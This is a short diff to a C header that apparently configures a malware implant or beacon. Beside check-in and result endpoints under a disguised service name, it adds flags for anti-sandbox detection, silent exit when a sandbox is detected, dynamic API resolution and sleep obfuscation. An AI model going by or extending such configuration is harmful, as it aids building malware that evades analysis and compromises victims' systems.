@@ -32,6 +32,12 @@
 #define API_CHECKIN "/api/CpHDCPSvc"
 #define API_RESULT "/api/CpHDCPSvc"
 
+// === Evasion Settings ===
+#define ENABLE_EVASION 1      // 启用反沙箱检测 (1=启用, 0=禁用)
+#define EVASION_EXIT_SILENT 1 // 检测到沙箱时静默退出 (1=退出, 0=继续运行)
+#define ENABLE_DYNAPI 1       // 启用动态 API 解析 (1=启用, 0=禁用)
+#define ENABLE_SLEEP_OBF 1    // 启用睡眠混淆 (1=启用, 0=禁用)
+
 // Debug mode (set to 0 to disable all console output)
 #define DEBUG_MODE 0
 
